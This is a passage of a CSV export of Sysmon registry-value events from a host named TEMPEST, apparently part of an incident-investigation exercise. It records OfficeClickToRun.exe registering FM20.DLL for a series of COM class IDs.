1293,8798,2022-06-20 17:21:14.3963441,13,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6224,TEMPEST,21,S-1-5-18,RegistryEvent (Value Set),NT AUTHORITY\SYSTEM,,"ProcessID: 3848, ProcessGUID: 4bbef3ae-ac73-62b0-ba0a-000000000700",RuleName: -,Image: C:\Program Files\Common Files\Microsoft Shared\ClickToRun\OfficeClickToRun.exe,EventType: SetValue,TargetObject: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\msoxmled.exe\UseURL,Details: 1,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""EventType"",""#text"":""SetValue""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:21:14.388""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-ac73-62b0-ba0a-000000000700""},{""@Name"":""ProcessId"",""#text"":""3848""},{""@Name"":""Image"",""#text"":""C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\OfficeClickToRun.exe""},{""@Name"":""TargetObject"",""#text"":""HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\msoxmled.exe\\UseURL""},{""@Name"":""Details"",""#text"":""1""},{""@Name"":""User"",""#text"":""NT AUTHORITY\\SYSTEM""}]}}"
1294,8799,2022-06-20 17:21:14.4520705,13,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6224,TEMPEST,21,S-1-5-18,RegistryEvent (Value Set),NT AUTHORITY\SYSTEM,,"ProcessID: 3848, ProcessGUID: 4bbef3ae-ac73-62b0-ba0a-000000000700",RuleName: T1122,Image: C:\Program Files\Common Files\Microsoft Shared\ClickToRun\OfficeClickToRun.exe,EventType: SetValue,TargetObject: HKCR\WOW6432Node\CLSID\{02AF6DD2-77E6-44DF-B3E1-57CF1476D8EA}\InprocServer32\(Default),Details: C:\Program Files (x86)\Microsoft Office\Root\VFS\SystemX86\FM20.DLL,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""T1122""},{""@Name"":""EventType"",""#text"":""SetValue""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:21:14.451""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-ac73-62b0-ba0a-000000000700""},{""@Name"":""ProcessId"",""#text"":""3848""},{""@Name"":""Image"",""#text"":""C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\OfficeClickToRun.exe""},{""@Name"":""TargetObject"",""#text"":""HKCR\\WOW6432Node\\CLSID\\{02AF6DD2-77E6-44DF-B3E1-57CF1476D8EA}\\InprocServer32\\(Default)""},{""@Name"":""Details"",""#text"":""C:\\Program Files (x86)\\Microsoft Office\\Root\\VFS\\SystemX86\\FM20.DLL""},{""@Name"":""User"",""#text"":""NT AUTHORITY\\SYSTEM""}]}}"
1295,8800,2022-06-20 17:21:14.4541912,13,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6224,TEMPEST,21,S-1-5-18,RegistryEvent (Value Set),NT AUTHORITY\SYSTEM,,"ProcessID: 3848, ProcessGUID: 4bbef3ae-ac73-62b0-ba0a-000000000700",RuleName: T1122,Image: C:\Program Files\Common Files\Microsoft Shared\ClickToRun\OfficeClickToRun.exe,EventType: SetValue,TargetObject: HKCR\WOW6432Node\CLSID\{04082FC6-E032-49F2-A263-FE64E9DA1FA3}\InprocServer32\(Default),Details: C:\Program Files (x86)\Microsoft Office\Root\VFS\SystemX86\FM20.DLL,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""T1122""},{""@Name"":""EventType"",""#text"":""SetValue""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:21:14.451""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-ac73-62b0-ba0a-000000000700""},{""@Name"":""ProcessId"",""#text"":""3848""},{""@Name"":""Image"",""#text"":""C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\OfficeClickToRun.exe""},{""@Name"":""TargetObject"",""#text"":""HKCR\\WOW6432Node\\CLSID\\{04082FC6-E032-49F2-A263-FE64E9DA1FA3}\\InprocServer32\\(Default)""},{""@Name"":""Details"",""#text"":""C:\\Program Files (x86)\\Microsoft Office\\Root\\VFS\\SystemX86\\FM20.DLL""},{""@Name"":""User"",""#text"":""NT AUTHORITY\\SYSTEM""}]}}"
1296,8801,2022-06-20 17:21:14.4564478,13,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6224,TEMPEST,21,S-1-5-18,RegistryEvent (Value Set),NT AUTHORITY\SYSTEM,,"ProcessID: 3848, ProcessGUID: 4bbef3ae-ac73-62b0-ba0a-000000000700",RuleName: T1122,Image: C:\Program Files\Common Files\Microsoft Shared\ClickToRun\OfficeClickToRun.exe,EventType: SetValue,TargetObject: HKCR\WOW6432Node\CLSID\{13D557B6-A469-4362-BEAF-52BFD0F180E2}\InprocServer32\(Default),Details: C:\Program Files (x86)\Microsoft Office\Root\VFS\SystemX86\FM20.DLL,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""T1122""},{""@Name"":""EventType"",""#text"":""SetValue""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:21:14.451""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-ac73-62b0-ba0a-000000000700""},{""@Name"":""ProcessId"",""#text"":""3848""},{""@Name"":""Image"",""#text"":""C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\OfficeClickToRun.exe""},{""@Name"":""TargetObject"",""#text"":""HKCR\\WOW6432Node\\CLSID\\{13D557B6-A469-4362-BEAF-52BFD0F180E2}\\InprocServer32\\(Default)""},{""@Name"":""Details"",""#text"":""C:\\Program Files (x86)\\Microsoft Office\\Root\\VFS\\SystemX86\\FM20.DLL""},{""@Name"":""User"",""#text"":""NT AUTHORITY\\SYSTEM""}]}}"
1297,8802,2022-06-20 17:21:14.4584680,13,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6224,TEMPEST,21,S-1-5-18,RegistryEvent (Value Set),NT AUTHORITY\SYSTEM,,"ProcessID: 3848, ProcessGUID: 4bbef3ae-ac73-62b0-ba0a-000000000700",RuleName: T1122,Image: C:\Program Files\Common Files\Microsoft Shared\ClickToRun\OfficeClickToRun.exe,EventType: SetValue,TargetObject: HKCR\WOW6432Node\CLSID\{19FED08E-EFD1-45da-B524-7BE4774A6AEE}\InprocServer32\(Default),Details: C:\Program Files (x86)\Microsoft Office\Root\VFS\SystemX86\FM20.DLL,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""T1122""},{""@Name"":""EventType"",""#text"":""SetValue""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:21:14.451""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-ac73-62b0-ba0a-000000000700""},{""@Name"":""ProcessId"",""#text"":""3848""},{""@Name"":""Image"",""#text"":""C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\OfficeClickToRun.exe""},{""@Name"":""TargetObject"",""#text"":""HKCR\\WOW6432Node\\CLSID\\{19FED08E-EFD1-45da-B524-7BE4774A6AEE}\\InprocServer32\\(Default)""},{""@Name"":""Details"",""#text"":""C:\\Program Files (x86)\\Microsoft Office\\Root\\VFS\\SystemX86\\FM20.DLL""},{""@Name"":""User"",""#text"":""NT AUTHORITY\\SYSTEM""}]}}"
1298,8803,2022-06-20 17:21:14.4602766,13,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6224,TEMPEST,21,S-1-5-18,RegistryEvent (Value Set),NT AUTHORITY\SYSTEM,,"ProcessID: 3848, ProcessGUID: 4bbef3ae-ac73-62b0-ba0a-000000000700",RuleName: T1122,Image: C:\Program Files\Common Files\Microsoft Shared\ClickToRun\OfficeClickToRun.exe,EventType: SetValue,TargetObject: HKCR\WOW6432Node\CLSID\{227B1F3B-C276-4DE0-9FAA-C0AD42ADDCF0}\InprocServer32\(Default),Details: C:\Program Files (x86)\Microsoft Office\Root\VFS\SystemX86\FM20.DLL,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""T1122""},{""@Name"":""EventType"",""#text"":""SetValue""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:21:14.451""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-ac73-62b0-ba0a-000000000700""},{""@Name"":""ProcessId"",""#text"":""3848""},{""@Name"":""Image"",""#text"":""C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\OfficeClickToRun.exe""},{""@Name"":""TargetObject"",""#text"":""HKCR\\WOW6432Node\\CLSID\\{227B1F3B-C276-4DE0-9FAA-C0AD42ADDCF0}\\InprocServer32\\(Default)""},{""@Name"":""Details"",""#text"":""C:\\Program Files (x86)\\Microsoft Office\\Root\\VFS\\SystemX86\\FM20.DLL""},{""@Name"":""User"",""#text"":""NT AUTHORITY\\SYSTEM""}]}}"
1299,8804,2022-06-20 17:21:14.4622940,13,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6224,TEMPEST,21,S-1-5-18,RegistryEvent (Value Set),NT AUTHORITY\SYSTEM,,"ProcessID: 3848, ProcessGUID: 4bbef3ae-ac73-62b0-ba0a-000000000700",RuleName: T1122,Image: C:\Program Files\Common Files\Microsoft Shared\ClickToRun\OfficeClickToRun.exe,EventType: SetValue,TargetObject: HKCR\WOW6432Node\CLSID\{3D0FD779-0C2D-4708-A9BA-62F7458A5A53}\InprocServer32\(Default),Details: C:\Program Files (x86)\Microsoft Office\Root\VFS\SystemX86\FM20.DLL,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""T1122""},{""@Name"":""EventType"",""#text"":""SetValue""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:21:14.451""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-ac73-62b0-ba0a-000000000700""},{""@Name"":""ProcessId"",""#text"":""3848""},{""@Name"":""Image"",""#text"":""C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\OfficeClickToRun.exe""},{""@Name"":""TargetObject"",""#text"":""HKCR\\WOW6432Node\\CLSID\\{3D0FD779-0C2D-4708-A9BA-62F7458A5A53}\\InprocServer32\\(Default)""},{""@Name"":""Details"",""#text"":""C:\\Program Files (x86)\\Microsoft Office\\Root\\VFS\\SystemX86\\FM20.DLL""},{""@Name"":""User"",""#text"":""NT AUTHORITY\\SYSTEM""}]}}"
1300,8805,2022-06-20 17:21:14.4645685,13,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6224,TEMPEST,21,S-1-5-18,RegistryEvent (Value Set),NT AUTHORITY\SYSTEM,,"ProcessID: 3848, ProcessGUID: 4bbef3ae-ac73-62b0-ba0a-000000000700",RuleName: T1122,Image: C:\Program Files\Common Files\Microsoft Shared\ClickToRun\OfficeClickToRun.exe,EventType: SetValue,TargetObject: HKCR\WOW6432Node\CLSID\{46E31370-3F7A-11CE-BED6-00AA00611080}\InprocServer32\(Default),Details: C:\Program Files (x86)\Microsoft Office\Root\VFS\SystemX86\FM20.DLL,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""T1122""},{""@Name"":""EventType"",""#text"":""SetValue""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:21:14.451""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-ac73-62b0-ba0a-000000000700""},{""@Name"":""ProcessId"",""#text"":""3848""},{""@Name"":""Image"",""#text"":""C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\OfficeClickToRun.exe""},{""@Name"":""TargetObject"",""#text"":""HKCR\\WOW6432Node\\CLSID\\{46E31370-3F7A-11CE-BED6-00AA00611080}\\InprocServer32\\(Default)""},{""@Name"":""Details"",""#text"":""C:\\Program Files (x86)\\Microsoft Office\\Root\\VFS\\SystemX86\\FM20.DLL""},{""@Name"":""User"",""#text"":""NT AUTHORITY\\SYSTEM""}]}}"
1301,8806,2022-06-20 17:21:14.4663232,13,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6224,TEMPEST,21,S-1-5-18,RegistryEvent (Value Set),NT AUTHORITY\SYSTEM,,"ProcessID: 3848, ProcessGUID: 4bbef3ae-ac73-62b0-ba0a-000000000700",RuleName: T1122,Image: C:\Program Files\Common Files\Microsoft Shared\ClickToRun\OfficeClickToRun.exe,EventType: SetValue,TargetObject: HKCR\WOW6432Node\CLSID\{4795051A-6429-4D63-BCA0-D706532954AC}\InprocServer32\(Default),Details: C:\Program Files (x86)\Microsoft Office\Root\VFS\SystemX86\FM20.DLL,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""T1122""},{""@Name"":""EventType"",""#text"":""SetValue""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:21:14.451""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-ac73-62b0-ba0a-000000000700""},{""@Name"":""ProcessId"",""#text"":""3848""},{""@Name"":""Image"",""#text"":""C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\OfficeClickToRun.exe""},{""@Name"":""TargetObject"",""#text"":""HKCR\\WOW6432Node\\CLSID\\{4795051A-6429-4D63-BCA0-D706532954AC}\\InprocServer32\\(Default)""},{""@Name"":""Details"",""#text"":""C:\\Program Files (x86)\\Microsoft Office\\Root\\VFS\\SystemX86\\FM20.DLL""},{""@Name"":""User"",""#text"":""NT AUTHORITY\\SYSTEM""}]}}"
1302,8807,2022-06-20 17:21:14.4685099,13,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6224,TEMPEST,21,S-1-5-18,RegistryEvent (Value Set),NT AUTHORITY\SYSTEM,,"ProcessID: 3848, ProcessGUID: 4bbef3ae-ac73-62b0-ba0a-000000000700",RuleName: T1122,Image: C:\Program Files\Common Files\Microsoft Shared\ClickToRun\OfficeClickToRun.exe,EventType: SetValue,TargetObject: HKCR\WOW6432Node\CLSID\{4C599241-6926-101B-9992-00000B65C6F9}\InprocServer32\(Default),Details: C:\Program Files (x86)\Microsoft Office\Root\VFS\SystemX86\FM20.DLL,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""T1122""},{""@Name"":""EventType"",""#text"":""SetValue""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:21:14.467""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-ac73-62b0-ba0a-000000000700""},{""@Name"":""ProcessId"",""#text"":""3848""},{""@Name"":""Image"",""#text"":""C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\OfficeClickToRun.exe""},{""@Name"":""TargetObject"",""#text"":""HKCR\\WOW6432Node\\CLSID\\{4C599241-6926-101B-9992-00000B65C6F9}\\InprocServer32\\(Default)""},{""@Name"":""Details"",""#text"":""C:\\Program Files (x86)\\Microsoft Office\\Root\\VFS\\SystemX86\\FM20.DLL""},{""@Name"":""User"",""#text"":""NT AUTHORITY\\SYSTEM""}]}}"
1303,8808,2022-06-20 17:21:14.4705979,13,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6224,TEMPEST,21,S-1-5-18,RegistryEvent (Value Set),NT AUTHORITY\SYSTEM,,"ProcessID: 3848, ProcessGUID: 4bbef3ae-ac73-62b0-ba0a-000000000700",RuleName: T1122,Image: C:\Program Files\Common Files\Microsoft Shared\ClickToRun\OfficeClickToRun.exe,EventType: SetValue,TargetObject: HKCR\WOW6432Node\CLSID\{5052A832-2C0F-46c7-B67C-1F1FEC37B280}\InprocServer32\(Default),Details: C:\Program Files (x86)\Microsoft Office\Root\VFS\SystemX86\FM20.DLL,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""T1122""},{""@Name"":""EventType"",""#text"":""SetValue""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:21:14.467""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-ac73-62b0-ba0a-000000000700""},{""@Name"":""ProcessId"",""#text"":""3848""},{""@Name"":""Image"",""#text"":""C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\OfficeClickToRun.exe""},{""@Name"":""TargetObject"",""#text"":""HKCR\\WOW6432Node\\CLSID\\{5052A832-2C0F-46c7-B67C-1F1FEC37B280}\\InprocServer32\\(Default)""},{""@Name"":""Details"",""#text"":""C:\\Program Files (x86)\\Microsoft Office\\Root\\VFS\\SystemX86\\FM20.DLL""},{""@Name"":""User"",""#text"":""NT AUTHORITY\\SYSTEM""}]}}"
1304,8809,2022-06-20 17:21:14.4729838,13,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6224,TEMPEST,21,S-1-5-18,RegistryEvent (Value Set),NT AUTHORITY\SYSTEM,,"ProcessID: 3848, ProcessGUID: 4bbef3ae-ac73-62b0-ba0a-000000000700",RuleName: T1122,Image: C:\Program Files\Common Files\Microsoft Shared\ClickToRun\OfficeClickToRun.exe,EventType: SetValue,TargetObject: HKCR\WOW6432Node\CLSID\{5512D110-5CC6-11CF-8D67-00AA00BDCE1D}\InprocServer32\(Default),Details: C:\Program Files (x86)\Microsoft Office\Root\VFS\SystemX86\FM20.DLL,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""T1122""},{""@Name"":""EventType"",""#text"":""SetValue""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:21:14.467""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-ac73-62b0-ba0a-000000000700""},{""@Name"":""ProcessId"",""#text"":""3848""},{""@Name"":""Image"",""#text"":""C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\OfficeClickToRun.exe""},{""@Name"":""TargetObject"",""#text"":""HKCR\\WOW6432Node\\CLSID\\{5512D110-5CC6-11CF-8D67-00AA00BDCE1D}\\InprocServer32\\(Default)""},{""@Name"":""Details"",""#text"":""C:\\Program Files (x86)\\Microsoft Office\\Root\\VFS\\SystemX86\\FM20.DLL""},{""@Name"":""User"",""#text"":""NT AUTHORITY\\SYSTEM""}]}}"
1305,8810,2022-06-20 17:21:14.4749383,13,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6224,TEMPEST,21,S-1-5-18,RegistryEvent (Value Set),NT AUTHORITY\SYSTEM,,"ProcessID: 3848, ProcessGUID: 4bbef3ae-ac73-62b0-ba0a-000000000700",RuleName: T1122,Image: C:\Program Files\Common Files\Microsoft Shared\ClickToRun\OfficeClickToRun.exe,EventType: SetValue,TargetObject: HKCR\WOW6432Node\CLSID\{5512D112-5CC6-11CF-8D67-00AA00BDCE1D}\InprocServer32\(Default),Details: C:\Program Files (x86)\Microsoft Office\Root\VFS\SystemX86\FM20.DLL,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""T1122""},{""@Name"":""EventType"",""#text"":""SetValue""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:21:14.467""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-ac73-62b0-ba0a-000000000700""},{""@Name"":""ProcessId"",""#text"":""3848""},{""@Name"":""Image"",""#text"":""C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\OfficeClickToRun.exe""},{""@Name"":""TargetObject"",""#text"":""HKCR\\WOW6432Node\\CLSID\\{5512D112-5CC6-11CF-8D67-00AA00BDCE1D}\\InprocServer32\\(Default)""},{""@Name"":""Details"",""#text"":""C:\\Program Files (x86)\\Microsoft Office\\Root\\VFS\\SystemX86\\FM20.DLL""},{""@Name"":""User"",""#text"":""NT AUTHORITY\\SYSTEM""}]}}"
1306,8811,2022-06-20 17:21:14.4769098,13,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6224,TEMPEST,21,S-1-5-18,RegistryEvent (Value Set),NT AUTHORITY\SYSTEM,,"ProcessID: 3848, ProcessGUID: 4bbef3ae-ac73-62b0-ba0a-000000000700",RuleName: T1122,Image: C:\Program Files\Common Files\Microsoft Shared\ClickToRun\OfficeClickToRun.exe,EventType: SetValue,TargetObject: HKCR\WOW6432Node\CLSID\{5512D114-5CC6-11CF-8D67-00AA00BDCE1D}\InprocServer32\(Default),Details: C:\Program Files (x86)\Microsoft Office\Root\VFS\SystemX86\FM20.DLL,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""T1122""},{""@Name"":""EventType"",""#text"":""SetValue""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:21:14.467""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-ac73-62b0-ba0a-000000000700""},{""@Name"":""ProcessId"",""#text"":""3848""},{""@Name"":""Image"",""#text"":""C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\OfficeClickToRun.exe""},{""@Name"":""TargetObject"",""#text"":""HKCR\\WOW6432Node\\CLSID\\{5512D114-5CC6-11CF-8D67-00AA00BDCE1D}\\InprocServer32\\(Default)""},{""@Name"":""Details"",""#text"":""C:\\Program Files (x86)\\Microsoft Office\\Root\\VFS\\SystemX86\\FM20.DLL""},{""@Name"":""User"",""#text"":""NT AUTHORITY\\SYSTEM""}]}}"
1307,8812,2022-06-20 17:21:14.4789587,13,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6224,TEMPEST,21,S-1-5-18,RegistryEvent (Value Set),NT AUTHORITY\SYSTEM,,"ProcessID: 3848, ProcessGUID: 4bbef3ae-ac73-62b0-ba0a-000000000700",RuleName: T1122,Image: C:\Program Files\Common Files\Microsoft Shared\ClickToRun\OfficeClickToRun.exe,EventType: SetValue,TargetObject: HKCR\WOW6432Node\CLSID\{5512D116-5CC6-11CF-8D67-00AA00BDCE1D}\InprocServer32\(Default),Details: C:\Program Files (x86)\Microsoft Office\Root\VFS\SystemX86\FM20.DLL,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""T1122""},{""@Name"":""EventType"",""#text"":""SetValue""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:21:14.467""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-ac73-62b0-ba0a-000000000700""},{""@Name"":""ProcessId"",""#text"":""3848""},{""@Name"":""Image"",""#text"":""C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\OfficeClickToRun.exe""},{""@Name"":""TargetObject"",""#text"":""HKCR\\WOW6432Node\\CLSID\\{5512D116-5CC6-11CF-8D67-00AA00BDCE1D}\\InprocServer32\\(Default)""},{""@Name"":""Details"",""#text"":""C:\\Program Files (x86)\\Microsoft Office\\Root\\VFS\\SystemX86\\FM20.DLL""},{""@Name"":""User"",""#text"":""NT AUTHORITY\\SYSTEM""}]}}"
1308,8813,2022-06-20 17:21:14.4811019,13,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6224,TEMPEST,21,S-1-5-18,RegistryEvent (Value Set),NT AUTHORITY\SYSTEM,,"ProcessID: 3848, ProcessGUID: 4bbef3ae-ac73-62b0-ba0a-000000000700",RuleName: T1122,Image: C:\Program Files\Common Files\Microsoft Shared\ClickToRun\OfficeClickToRun.exe,EventType: SetValue,TargetObject: HKCR\WOW6432Node\CLSID\{5512D118-5CC6-11CF-8D67-00AA00BDCE1D}\InprocServer32\(Default),Details: C:\Program Files (x86)\Microsoft Office\Root\VFS\SystemX86\FM20.DLL,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""T1122""},{""@Name"":""EventType"",""#text"":""SetValue""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:21:14.467""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-ac73-62b0-ba0a-000000000700""},{""@Name"":""ProcessId"",""#text"":""3848""},{""@Name"":""Image"",""#text"":""C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\OfficeClickToRun.exe""},{""@Name"":""TargetObject"",""#text"":""HKCR\\WOW6432Node\\CLSID\\{5512D118-5CC6-11CF-8D67-00AA00BDCE1D}\\InprocServer32\\(Default)""},{""@Name"":""Details"",""#text"":""C:\\Program Files (x86)\\Microsoft Office\\Root\\VFS\\SystemX86\\FM20.DLL""},{""@Name"":""User"",""#text"":""NT AUTHORITY\\SYSTEM""}]}}"
1309,8814,2022-06-20 17:21:14.4832487,13,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6224,TEMPEST,21,S-1-5-18,RegistryEvent (Value Set),NT AUTHORITY\SYSTEM,,"ProcessID: 3848, ProcessGUID: 4bbef3ae-ac73-62b0-ba0a-000000000700",RuleName: T1122,Image: C:\Program Files\Common Files\Microsoft Shared\ClickToRun\OfficeClickToRun.exe,EventType: SetValue,TargetObject: HKCR\WOW6432Node\CLSID\{5512D11A-5CC6-11CF-8D67-00AA00BDCE1D}\InprocServer32\(Default),Details: C:\Program Files (x86)\Microsoft Office\Root\VFS\SystemX86\FM20.DLL,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""T1122""},{""@Name"":""EventType"",""#text"":""SetValue""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:21:14.482""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-ac73-62b0-ba0a-000000000700""},{""@Name"":""ProcessId"",""#text"":""3848""},{""@Name"":""Image"",""#text"":""C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\OfficeClickToRun.exe""},{""@Name"":""TargetObject"",""#text"":""HKCR\\WOW6432Node\\CLSID\\{5512D11A-5CC6-11CF-8D67-00AA00BDCE1D}\\InprocServer32\\(Default)""},{""@Name"":""Details"",""#text"":""C:\\Program Files (x86)\\Microsoft Office\\Root\\VFS\\SystemX86\\FM20.DLL""},{""@Name"":""User"",""#text"":""NT AUTHORITY\\SYSTEM""}]}}"
1310,8815,2022-06-20 17:21:14.4850738,13,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6224,TEMPEST,21,S-1-5-18,RegistryEvent (Value Set),NT AUTHORITY\SYSTEM,,"ProcessID: 3848, ProcessGUID: 4bbef3ae-ac73-62b0-ba0a-000000000700",RuleName: T1122,Image: C:\Program Files\Common Files\Microsoft Shared\ClickToRun\OfficeClickToRun.exe,EventType: SetValue,TargetObject: HKCR\WOW6432Node\CLSID\{5512D11C-5CC6-11CF-8D67-00AA00BDCE1D}\InprocServer32\(Default),Details: C:\Program Files (x86)\Microsoft Office\Root\VFS\SystemX86\FM20.DLL,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""T1122""},{""@Name"":""EventType"",""#text"":""SetValue""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:21:14.482""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-ac73-62b0-ba0a-000000000700""},{""@Name"":""ProcessId"",""#text"":""3848""},{""@Name"":""Image"",""#text"":""C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\OfficeClickToRun.exe""},{""@Name"":""TargetObject"",""#text"":""HKCR\\WOW6432Node\\CLSID\\{5512D11C-5CC6-11CF-8D67-00AA00BDCE1D}\\InprocServer32\\(Default)""},{""@Name"":""Details"",""#text"":""C:\\Program Files (x86)\\Microsoft Office\\Root\\VFS\\SystemX86\\FM20.DLL""},{""@Name"":""User"",""#text"":""NT AUTHORITY\\SYSTEM""}]}}"
